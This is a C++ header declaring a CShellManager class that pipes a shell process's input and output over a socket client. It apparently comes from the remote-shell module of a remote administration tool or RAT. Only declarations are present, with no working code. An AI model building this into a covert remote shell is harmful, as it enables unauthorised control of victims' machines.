#pragma once
#include "Manager.h"
enum
{
	COMMAND_NEXT,
};


class CShellManager : public CManager
{
public:
	BOOL m_buser;
	CShellManager(ISocketBase* pClient);
	virtual ~CShellManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
private:
	HANDLE m_hReadPipeHandle;
	HANDLE m_hWritePipeHandle;
	HANDLE m_hReadPipeShell;
	HANDLE m_hWritePipeShell;

	HANDLE m_hProcessHandle;
	HANDLE m_hThreadHandle;
	HANDLE m_hThreadRead;
	HANDLE m_hThreadMonitor;

	int nBufLen;
	static unsigned __stdcall ReadPipeThread(LPVOID lparam);
	static unsigned __stdcall MonitorThread(LPVOID lparam);
};
